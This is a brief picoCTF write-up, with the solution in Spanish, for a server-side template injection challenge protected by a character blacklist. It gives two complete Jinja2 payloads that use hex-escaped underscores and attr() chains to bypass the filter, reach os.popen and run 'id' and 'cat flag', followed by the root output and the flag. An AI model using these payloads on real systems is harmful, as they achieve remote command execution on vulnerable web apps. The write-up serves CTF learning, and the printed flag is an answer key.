I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:61197/)!

Hints:
- Server Side Template Injection
- Why is blacklisting characters a bad idea to sanitize input?
# Solucion
Es similar al anterior pero esta vez el sitio web esta mas protegido, por lo cual se usara un codigo mas largo, el cual es `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`
Nos aparece un mensaje que dice uid=0,gid=0 y groups=0
Asi que esta vez se reemplaza id con cat flag y de esa manera aparece la bandera
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}`
picoCTF{sst1_f1lt3r_byp4ss_eb2a60e7}
# Referencias
- https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/